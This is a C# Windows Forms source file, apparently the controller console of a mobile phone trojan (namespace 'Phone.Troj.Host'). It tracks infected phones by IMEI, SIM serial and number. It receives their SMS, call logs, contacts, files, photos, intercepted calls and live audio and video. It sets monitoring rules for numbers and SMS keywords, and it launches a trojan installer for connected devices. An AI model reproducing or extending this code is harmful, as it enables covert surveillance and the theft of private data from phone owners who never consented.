using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using InOut;
using InOut.Entity;
using InOut.PacketImp;
using WangAn.Device.Phone;
using IIE.Phone.Troj.Host.Model;

namespace IIE.Phone.Troj.Host
{
    public partial class MainFrm : Form, IMainView
    {
        private readonly IConfig config;
        private readonly IDevicesManager devicesManager;
        public ILog Log { get; private set; }
        public IServer Server { get; set; }
        private readonly Dictionary<string, UserOptionFrm> userOptionFrmDict;
        private readonly List<UserInfo> userList;
        private List<string> logBuffer; 
        public MainFrm(IConfig config, ILog log,IDevicesManager devicesManager)
        {
            this.config = config;
            this.devicesManager = devicesManager;
            Log = log;
            InitializeComponent();
            tsShowLog.Checked = true;
            scMainPanel.Panel2Collapsed = !tsShowLog.Checked;
            userList = new List<UserInfo>();
            userOptionFrmDict = new Dictionary<string, UserOptionFrm>();
            logBuffer = new List<string>();
            Shown += MainFrm_Shown;
            Closed += MainFrm_Closed;
            Log.LogHandler += Log_LogHandler;
        }

        void MainFrm_Closed(object sender, EventArgs e)
        {
            devicesManager.StopListenDevicesChanged();
        }

        void Log_LogHandler(string message)
        {
            logBuffer.Insert(0,message);
            Invoke(new MethodInvoker(() => rtbLog.Lines = logBuffer.ToArray()));
        }

        void MainFrm_Shown(object sender, EventArgs e)
        {
            if (Server != null)
                Server.SetOnlineAsyn();
            //Log.LogTxt("服务器监听已开启!监听端口号:"+config.Port);
        }



        private void tsExit_Click(object sender, EventArgs e)
        {
            Close();
            Server.Realse();//原来的代码
        }

        private void tsShowLog_Click(object sender, EventArgs e)
        {
            tsShowLog.Checked = !tsShowLog.Checked;
            scMainPanel.Panel2Collapsed = !tsShowLog.Checked;
        }

        private void tsOpneUserInterface_Click(object sender, EventArgs e)
        {
            if (lvClient.SelectedItems.Count > 0)
            {
                var user = (UserInfo) lvClient.SelectedItems[0].Tag;

                if (!userOptionFrmDict.ContainsKey(user.Imei))
                {
                    userOptionFrmDict[user.Imei] = new UserOptionFrm(user.Imei,Server,Log);
                    userOptionFrmDict[user.Imei].Show(this);
                    userOptionFrmDict[user.Imei].Closed += (s, a) => userOptionFrmDict.Remove(user.Imei);
                }
                userOptionFrmDict[user.Imei].Focus();
            }
        }

        private void tsDisconnect_Click(object sender, EventArgs e)
        {
            if (lvClient.SelectedItems.Count > 0)
            {
                var user = (UserInfo) lvClient.SelectedItems[0].Tag;
                Server.CommandSender(user.Imei,Protocol.Disconnect,null);
                DeleteUser(user.Imei);
            }
        }

        private void tsAbout_Click(object sender, EventArgs e)
        {
            new AboutFrm().ShowDialog(this);
        }

        public void Invoker(Action action)
        {
            if (InvokeRequired)
            {
                Invoke(action);
                return;
            }
            action();
        }

        public void DeleteUser(string imei)
        {
            Action action = () =>
            {
                var user = userList.Find(info => info.Imei == imei);
                if (user != null)
                {
                    UserOptionFrm userOptionFrm;
                    if (userOptionFrmDict.TryGetValue(user.Imei, out userOptionFrm))
                    {
                        userOptionFrm.Close();
                        userOptionFrmDict.Remove(user.Imei);
                    }
                    userList.Remove(user);
                    ListViewItem viewItem = lvClient.Items.Cast<ListViewItem>().FirstOrDefault(item => item.Tag == user);
                    if (viewItem != null)
                        Invoker(() => lvClient.Items.Remove(viewItem));
                }
            };

            Invoke(action);
        }

        public void AddUser(UserInfo userInfo)
        {
            userList.Add(userInfo);
            var viewItem = new ListViewItem(new[]
            {
                userInfo.Imei,
                userInfo.SimSerial,
                userInfo.PhoneNumber
            }) {Tag = userInfo};
            Invoker(() => lvClient.Items.Add(viewItem));
            Log.LogTxt("客户端已连接，IMEI="+userInfo.Imei);
        }

        private void UserOptionFrmDo(string imei, Action<UserOptionFrm> action)
        {
            if (userOptionFrmDict.ContainsKey(imei))
            {
                action(userOptionFrmDict[imei]);
            }
        }

        public void SaveSoundChannel(string imei, int channel)
        {
            UserOptionFrmDo( imei,gui => gui.SaveSoundChannel(channel));
        }

        public void SavePictureChannel(string imei, int channel)
        {
            UserOptionFrmDo(imei, gui => gui.SavePictureChannel(channel));
        }

        public void SaveCallLogChannel(string imei, int channel)
        {
            UserOptionFrmDo(imei, gui => gui.SaveCallLogChannel(channel));
        }

        public void SaveSMSChannel(string imei, int channel)
        {
            UserOptionFrmDo(imei, gui => gui.SaveSMSChannel(channel));
        }

        public void SaveContactChannel(string imei, int channel)
        {
            UserOptionFrmDo(imei, gui => gui.SaveContactChannel(channel));
        }

        public void SaveMonitorCallChannel(string imei, int channel)
        {
            UserOptionFrmDo(imei, gui => gui.SaveMonitorCallChannel(channel));
        }

        public void SaveMonitorSMSChannel(string imei, int channel)
        {
            UserOptionFrmDo(imei, gui => gui.SaveMonitorSMSChannel(channel));
        }

        public void SaveVideoChannel(string imei, int channel)
        {
            UserOptionFrmDo(imei, gui => gui.SaveVideoChannel(channel));
        }

        public void UpdateAdvInformations(string imei, AdvancedInformationPacket packet)
        {
            UserOptionFrmDo(imei, gui => gui.UpdateAdvInformations(packet));
        }

        public void UpdateUserCallLogs(string imei, CallPacket[] list)
        {
            UserOptionFrmDo(imei, gui => gui.UpdateUserCallLogs(list));
        }

        public void AddMonitoredCall(string imei, int type, string phonenumber, string date, byte[] phonedata)
        {
            //MessageBox.Show("2");
            //MessageBox.Show("imei="+imei+phonenumber+date);
            UserOptionFrmDo(imei, gui => gui.AddMonitoredCall(type,phonenumber,date,phonedata));
        }

        public void UpdateContacts(string imei, Contact[] list)
        {
            UserOptionFrmDo(imei, gui => gui.UpdateContacts(list));
        }

        public void UpdateFileTree(string imei, MyFile[] list)
        {
            UserOptionFrmDo(imei, gui => gui.UpdateFileTree(list));
        }

        public void UpdateUserPicture(string imei, byte[] getData)
        {
            UserOptionFrmDo(imei, gui => gui.UpdateUserPicture(getData));
        }

        public void UpdatePreference(string imei, string ip, int port, bool waitTrigger, string[] phoneNumberCall, string[] phoneNumberSMS, string[] keywordSMS)
        {
            UserOptionFrmDo(imei, gui => gui.UpdatePreference(ip, port, waitTrigger, phoneNumberCall, phoneNumberSMS, keywordSMS));
        }

        public void UpdateSMS(string imei, SMSPacket[] list)
        {
            UserOptionFrmDo(imei, gui => gui.UpdateSMS(list));
        }

        public void AddMonitoredSMS(string imei, string address, long date, string body)
        {
            UserOptionFrmDo(imei, gui => gui.AddMonitoredSMS(address,date,body));
        }

        public void AddSoungBytes(string imei, byte[] data)
        {
            UserOptionFrmDo(imei, gui => gui.AddSoungBytes(data));
        }

        public void AddVideoBytes(string imei, byte[] data)
        {
            UserOptionFrmDo(imei, gui => gui.AddVideoBytes(data));
        }

        private void tsInstall_Click(object sender, EventArgs e)
        {
            var installFrm = new TrojInstallFrm(config, devicesManager);
            installFrm.ShowDialog(this);
        }

        private void MainFrm_Load(object sender, EventArgs e)
        {

        }

    }
}
